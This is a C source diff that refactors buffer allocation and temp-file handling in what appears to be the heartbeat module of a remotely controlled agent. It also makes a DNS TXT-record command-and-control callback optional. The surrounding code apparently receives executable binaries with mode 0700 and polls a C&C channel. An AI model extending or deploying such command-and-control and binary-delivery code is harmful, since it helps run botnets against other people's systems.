@@ -784,28 +784,19 @@ static void htbt_free_slv_ctx (htbt_slv_ctx_t *ctx) {
 }
 
 static bool htbt_alloc_slv_iobuf (htbt_slv_ctx_t *ctx) {
-	bool alloc;
-	alloc = prne_alloc_iobuf(
-		ctx->iobuf + 0,
-		2048);
-	alloc &= prne_alloc_iobuf(
-		ctx->iobuf + 1,
-		2048);
-	if (alloc) {
-		return true;
-	}
-
-	alloc = prne_alloc_iobuf(
-		ctx->iobuf + 0,
-		PRNE_HTBT_PROTO_MIN_BUF);
-	alloc &= prne_alloc_iobuf(
-		ctx->iobuf + 1,
-		PRNE_HTBT_PROTO_SUB_MIN_BUF);
-	if (alloc) {
-		return true;
-	}
-
-	return false;
+#define OPT_SIZE 2048
+	static const size_t ALLOC_MAT[2][3] = {
+		{ OPT_SIZE, PRNE_HTBT_PROTO_MIN_BUF, 0 },
+		{ OPT_SIZE, PRNE_HTBT_PROTO_SUB_MIN_BUF, 0 }
+	};
+	prne_static_assert(
+		OPT_SIZE >= PRNE_HTBT_PROTO_MIN_BUF &&
+			OPT_SIZE >= PRNE_HTBT_PROTO_SUB_MIN_BUF,
+		"Please reset OPT_SIZE.");
+	return
+		prne_try_alloc_iobuf(ctx->iobuf + 0, ALLOC_MAT[0]) &&
+		prne_try_alloc_iobuf(ctx->iobuf + 1, ALLOC_MAT[1]);
+#undef OPT_SIZE
 }
 
 static void htbt_slv_consume_outbuf (
@@ -1208,14 +1199,12 @@ static bool htbt_slv_srv_bin (
 	}
 
 	errno = 0;
-	path = ctx->cbset->tmpfile(ctx->cb_ctx, bin_meta.bin_size, 0700);
-	if (path == NULL) {
-		ret_status = PRNE_HTBT_STATUS_ERRNO;
-		ret_errno = errno;
-		goto SND_STATUS;
-	}
-
-	fd = open(path, O_WRONLY);
+	fd = ctx->cbset->tmpfile(
+		ctx->cb_ctx,
+		O_CREAT | O_TRUNC | O_WRONLY,
+		0700,
+		bin_meta.bin_size,
+		&path);
 	if (fd < 0) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_errno = errno;
@@ -1440,6 +1429,11 @@ static bool htbt_slv_srv_rcb (
 	size_t off,
 	const prne_htbt_msg_head_t *org_mh)
 {
+	static const size_t RCB_IB_SIZE[] = {
+		PRNE_HTBT_STDIO_LEN_MAX,
+		512,
+		0
+	};
 	bool ret = true;
 	prne_htbt_rcb_t rcb_f;
 	prne_htbt_ser_rc_t s_ret;
@@ -1485,9 +1479,7 @@ static bool htbt_slv_srv_rcb (
 		err = ENOMEDIUM;
 		goto STATUS_END;
 	}
-	if (!(prne_alloc_iobuf(&rcb_ib, PRNE_HTBT_STDIO_LEN_MAX) ||
-		prne_alloc_iobuf(&rcb_ib, 512)))
-	{
+	if (!prne_try_alloc_iobuf(&rcb_ib, RCB_IB_SIZE)) {
 		status = PRNE_HTBT_STATUS_ERRNO;
 		err = errno;
 		goto STATUS_END;
@@ -3115,7 +3107,6 @@ prne_htbt_t *prne_alloc_htbt (
 	prne_htbt_t *ret = NULL;
 
 	if (w == NULL ||
-		param->cb_f.cnc_txtrec == NULL ||
 		param->lbd_ssl_conf == NULL ||
 		param->main_ssl_conf == NULL ||
 		param->ctr_drbg == NULL ||
@@ -3147,7 +3138,7 @@ prne_htbt_t *prne_alloc_htbt (
 	prne_init_llist(&ret->lbd.conn_list);
 	ret->lbd.fd = -1;
 
-	if (param->resolv != NULL) {
+	if (param->resolv != NULL && param->cb_f.cnc_txtrec != NULL) {
 		ret->cncp.pth = pth_spawn(
 			PTH_ATTR_DEFAULT,
 			htbt_cncp_entry,
